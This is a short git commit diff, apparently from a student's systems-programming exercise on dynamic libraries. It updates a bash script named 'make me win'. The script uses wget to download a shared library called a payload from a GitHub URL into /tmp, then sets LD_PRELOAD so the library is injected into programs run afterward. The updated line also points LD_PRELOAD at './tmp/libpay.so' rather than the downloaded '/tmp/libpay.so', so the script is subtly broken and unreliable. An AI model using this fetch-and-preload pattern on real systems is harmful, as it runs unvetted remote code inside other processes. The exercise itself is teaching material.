68eca99e24b3a614794518a0a48c436b36d9c327
Dev Manuels <Emmanuel.umeile@gmail.com>
2023-08-22 18:29:38 +0100

    Update script and Payload

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -qO /tmp/libmal.so https://github.com/Dev-manuels/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libmal.so
-export LD_PRELOAD=/tmp/libmal.so
+wget -qO /tmp/libpay.so https://github.com/Dev-manuels/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libpay.so
+export LD_PRELOAD=./tmp/libpay.so
